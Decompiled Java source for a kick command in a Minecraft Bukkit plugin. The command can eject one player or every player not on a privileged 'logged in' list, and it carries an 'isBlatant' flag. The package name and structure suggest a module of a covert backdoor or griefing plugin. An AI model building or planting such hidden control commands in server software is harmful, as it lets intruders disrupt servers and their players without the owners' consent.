/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class KickCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("kick <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a2.getName())) continue;
                API.kickPlayer(a2);
            }
            p2.sendMessage(Settings.PREFIX("Everyone not logged in was kicked!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                API.kickPlayer(target);
                p2.sendMessage(Settings.PREFIX(target.getName() + " was kicked!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

